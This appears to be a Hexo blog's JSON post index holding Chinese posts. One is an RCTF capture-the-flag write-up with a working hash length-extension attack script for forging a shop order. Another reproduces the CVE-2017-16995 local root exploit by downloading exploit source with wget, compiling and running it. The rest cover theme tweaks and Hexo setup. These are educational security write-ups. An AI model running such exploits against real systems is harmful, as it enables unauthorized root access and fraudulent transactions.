'&amp;sign=%s' % sign print 'Your order:\\n%s\\n' % payment 长度拓展攻击假设密文A：xxxxx明文B：ABCD&emsp;&emsp;你知道(密文A+明文B)的哈希值和B，因为A我们不知道，爆破会比较困难，通过哈希长度拓展攻击可以修改B的内容假设我们的带的订单内容如下product=Flag&amp;price=99999&amp;timestamp=1526903707553295&amp;sign=9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4 那么明文B：product=Flag&amp;price=99999&amp;timestamp=1526903707553295sha256(密文A+明文B)：9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4如果我们可以把订单的明文添加一个&amp;price=1进去，那么pay的过程它经过for循环后最终价格会变化才能1，那么我们的目的就达到了最终的一键代码如下，需要安装两个库文件pip install pwntools pip install hashpumpy from pwn import * from hashpumpy import hashpump import time nc = remote(\"cpushop.2018.teamrois.cn\",43000) txt = nc.recvuntil('Command:') print txt nc.send('2') print nc.recvuntil('ID:') nc.send('9') code = nc.recvuntil('Command:') print code flag = code[13:134] hexdata = flag[57:] original = flag[0:51] add = '&amp;price=1' dic = [] print original for i in range(8,33): a,b = hashpump(hexdata,original,add,i) order = b + '&amp;sign=' + a nc.send('3') print nc.recvuntil('order:') print i print order nc.send(order) print nc.recvuntil('Command:') nc.interactive() tip:hexdata是A+B的哈希，original是B，add是要加的内容，i是A的长度。爆破A很困难，爆破A的长度就很简单了最后构造出来的订单式长这样子product=Flag&amp;price=99999&amp;timestamp=1526818398651000\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x88&amp;price=1&amp;sign=b842b4baa0d4405697b740a871ae60dd64617cdfa1846132373e1b3a371c0db3","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"},{"name":"crypto","slug":"crypto","permalink":"http://yoursite.com/tags/crypto/"},{"name":"RCTF","slug":"RCTF","permalink":"http://yoursite.com/tags/RCTF/"}]},{"title":"CVE-2017-16995本地提权复现","slug":"CVE-2017-16995","date":"2018-05-18T16:18:13.000Z","updated":"2020-09-18T03:14:11.343Z","comments":true,"path":"2018/05/19/CVE-2017-16995/","link":"","permalink":"http://yoursite.com/2018/05/19/CVE-2017-16995/","excerpt":"ubuntu本地提权漏洞复现参考资料Ubuntu内核提权:CVE-2017-16995漏洞复现漏洞预警 | Ubuntu存在本地提权漏洞（附EXP及应对措施）Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - ‘AF_PACKET’ Race Condition Privilege Escalation","text":"ubuntu本地提权漏洞复现参考资料Ubuntu内核提权:CVE-2017-16995漏洞复现漏洞预警 | Ubuntu存在本地提权漏洞（附EXP及应对措施）Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - ‘AF_PACKET’ Race Condition Privilege Escalation 漏洞影响版本Linux Kernel Version 4.14-4.4仅影响Ubuntu/Debian发行版本 准备环境查看内核版本uname -r 搜索版本apt-cache search linux 下载4.4版本的内核sudo apt-get install linux-headers-4.4.0-81-generic linux-image-4.4.0-81-generic 更换内核sudo nano /boot/grub/grub.cfg 替换成下图ctrl+o保存，ctrl+x退出，重启到此，环境就配置完毕 验证脚本下载wget http://cyseclabs.com/pub/upstream44.c 编译gcc -o exp upstream44.c 运行./exp 可以看到前面的用户名已经从ubuntu变成了root，可以执行任何需要超级权限的命令 修复建议升级Linux Kernel 版本(需重启) echo \"deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe\" &gt; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt install linux-image-4.4.0-117-generic","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"http://yoursite.com/tags/漏洞/"},{"name":"CVE","slug":"CVE","permalink":"http://yoursite.com/tags/CVE/"},{"name":"提权","slug":"提权","permalink":"http://yoursite.com/tags/提权/"},{"name":"ubuntu","slug":"ubuntu","permalink":"http://yoursite.com/tags/ubuntu/"}]},{"title":"使用yilia主题","slug":"meihua","date":"2018-05-09T16:18:13.000Z","updated":"2020-09-23T11:40:25.109Z","comments":true,"path":"2018/05/10/meihua/","link":"","permalink":"http://yoursite.com/2018/05/10/meihua/","excerpt":"让你的博客更加好看添加阅读量添加访问量统计隐藏power链接","text":"让你的博客更加好看添加阅读量添加访问量统计隐藏power链接 添加阅读量在yilia主题下layout/_partial下的的article.ejs添加以下代码&lt;% if ( !index )&#123; %&gt; &lt;span class=\"archive-article-date\"&gt; 阅读量 &lt;span id=\"busuanzi_value_page_pv\"&gt;&lt;/span&gt; &lt;/span&gt; &lt;% &#125; %&gt; 算法a：pv的方式，单个用户连续点击n篇文章，记录n次访问量。算法b：uv的方式，单个用户连续点击n篇文章，只记录1次访客数。位置：&lt;/header&gt;后面，部分代码如下&lt;article id=\"&lt;%= post.layout %&gt;-&lt;%= post.slug %&gt;\" class=\"article article-type-&lt;%= post.layout %&gt; &lt;%if(index)&#123;%&gt; article-index&lt;%&#125;%&gt;\" itemscope itemprop=\"blogPost\"&gt; &lt;div class=\"article-inner\"&gt; &lt;% if (post.link || post.title)&#123; %&gt; &lt;header class=\"article-header\"&gt; &lt;%- partial('post/title', &#123;class_name: 'article-title'&#125;) %&gt; &lt;% if (!post.noDate)&#123; %&gt; &lt;%- partial('post/date', &#123;class_name: 'archive-article-date', date_format: null&#125;) %&gt; &lt;% &#125; %&gt; &lt;/header&gt; &lt;% if ( !index )&#123; %&gt; &lt;span class=\"archive-article-date\"&gt; 阅读量 &lt;span id=\"busuanzi_value_page_pv\"&gt;&lt;/span&gt; &lt;/span&gt; &lt;% &#125; %&gt; &lt;% &#125; %&gt; ``` ##### 添加访问量统计 打开同一目录下的`footer.ejs`文件，添加以下代码 本站访客数人次位置：`&lt;/footer&gt;`上面，代码如下 ```&lt;footer id=\"footer\"&gt; &lt;div class=\"outer\"&gt; &lt;div id=\"footer-info\"&gt; &lt;div class=\"footer-left\"&gt; &amp;copy; &lt;%= date(new Date(), 'YYYY') %&gt; &lt;%= config.author || config.title %&gt; &lt;/div&gt; &lt;div class=\"footer-right\"&gt; &lt;a href=\"http://hexo.io/\" target=\"_blank\"&gt;Hexo&lt;/a&gt; Theme &lt;a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\"&gt;Yilia&lt;/a&gt; by Litten &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script async src=\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"&gt;&lt;/script&gt; &lt;span id=\"busuanzi_container_site_uv\"&gt; 本站访客数&lt;span id=\"busuanzi_value_site_uv\"&gt;&lt;/span&gt;人次 &lt;/span&gt; &lt;/footer&gt; 隐藏power链接也是footer.ejs文件&lt;div class=\"footer-right\"&gt; &lt;a href=\"http://hexo.io/\" target=\"_blank\"&gt;Hexo&lt;/a&gt; Theme &lt;a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\"&gt;Yilia&lt;/a&gt; by Litten &lt;/div&gt; 对这段代码添加注释符&lt;!-- --&gt;&lt;!--&lt;div class=\"footer-right\"&gt; &lt;a href=\"http://hexo.io/\" target=\"_blank\"&gt;Hexo&lt;/a&gt; Theme &lt;a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\"&gt;Yilia&lt;/a&gt; by Litten &lt;/div&gt;--&gt; 或者你也可以写自己喜欢的文字上去，比如&lt;div&gt; 做自己想做的事~ &lt;/div&gt; 效果如下暂时做到这里，以后如果有看到喜欢的或者有好的想法都会补充","categories":[],"tags":[{"name":"美化","slug":"美化","permalink":"http://yoursite.com/tags/美化/"},{"name":"yilia","slug":"yilia","permalink":"http://yoursite.com/tags/yilia/"}]},{"title":"第一次搭建博客","slug":"frist-try","date":"2018-05-06T18:39:30.000Z","updated":"2020-09-17T06:56:39.116Z","comments":true,"path":"2018/05/07/frist-try/","link":"","permalink":"http://yoursite.com/2018/05/07/frist-try/","excerpt":"为什么要搭建博客呢？写博客可以增长知识写博客可以装逼","text":"为什么要搭建博客呢？写博客可以增长知识写博客可以装逼 写在前面&emsp;&emsp;写博客可以记录学习上遇到的问题，记录自己的学习过程，对于非常白的小白来说绝对不是我，自己扒资料扒博客是比较痛苦的，很多基础知识不会的话很容易出一些很难搜索到的问题，就比较痛苦了，建议可以先学习一些预备知识，下面讲一下整个搭博客的过程 概念 &emsp;&emsp;对于用云服务器这一类的建议在本地搭建一个虚拟机进行尝试后再对服务器动刀（大神绕过），因为已经做好了，我就拿本地复现一遍，我的服务器是ubuntu 16，本地也用同样的系统搭建，不同的系统命令也不同。我选用的框架是hexo,这个框架速度快、支持markdown、一键部署、有很多插件（还不是因为不会用其他的），网上也有很多同样的教程，教程千篇一律，bug各种各样，希望这篇博客对你有所帮助 大概流程就是安装nodejs环境--&gt;安装hexo--&gt;下载一款好看的主题（可省）--&gt;发布你的博客酱酱酱 一、nodejs安装教程sudo apt-get install nodejs sudo apt-get install npm 两行代码OK啦，不是ubuntu系统的可以点击这里查看其他命令–&gt;传送门 二、hexo安装sudo npm install -g hexo-cli 坑一apt-get 安装的nodejs是4.2.6，hexo需要6.9.0，爬了好多博客才找到sudo npm install -g n sudo n 6.9.0 或者 sudo n stable 现在执行刚刚的命令就可以安装hexo了，使用hexo -v 可以查看是否正确安装，正确安装会有以下输出提示hexo-cli: 1.1.0 os: Linux 4.10.0-28-generic linux x64 http_parser: 2.8.0 node: 10.0.0 v8: 6.6.346.24-node.5 uv: 1.20.2 zlib: 1.2.11 ares: 1.14.0 modules: 64 nghttp2: 1.29.0 napi: 3 openssl: 1.1.0h icu: 61.1 unicode: 10.0 cldr: 33.0 tz: 2018c 选择一个空的文件夹作为你的站点，在当前路径下初始化你的hexo(报错加sudo试试)hexo init npm install 这样子网站就初步建好了，网站的目录结构就是下面这样子的. ├── _config.yml ├── package.json ├── scaffolds ├── source | └── _posts └── themes &emsp;&emsp;_config.yml 文件存放着网站的配置信息，可以在这里配置大部分的参数。package.json 文件存放着插件信息，从中可以查看那些插件已经安装。scaffolds 是模板文件夹，新建文章时，Hexo 会根据 scaffold 来建立文件，不过这个模板和后面的主题里指的模板不一样。source 是存放用户资源的地方的文件夹，除 _posts 文件夹之外，开头命名为 _ (下划线) 的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹（别急，等下会生成的），而其他文件会被拷贝过去。themes 主题文件夹，Hexo 会根据主题来生成静态页面，我们以后自己安装的主题也都会放在这个文件夹下面，默认的 landscape 主题已经在里面了。现在我们启动我们的博客hexo server 简写 hexo s 提示4000端口被占用的百度下方法 完工不出意外应该都看得到这两条信息INFO Start processing INFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. 现在访问我们虚拟机的ip:4000就可以看到我们的博客啦再换一个好看点的主题就可以啦git clone https://github.com/iissnan/hexo-theme-next themes/next 要在站点目录下这个很重要！要在站点目录下这个很重要！要在站点目录下这个很重要！太笨了当初在这卡了久 重要的事情说三遍再在站点文件夹下的配置文件_config.yml更换主题就OK啦vim _config.yml 往下滚到这个位置theme: landscape 把landscape换成next就ok啦，最后重启下博客 完善&emsp;&emsp;相信很多小伙伴都觉得挺一般的，这个只是雏形，还有更多细节优化美化要去处理，觉得我的博客不错的可以看看这篇博客戳这里–&gt;here","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]}]}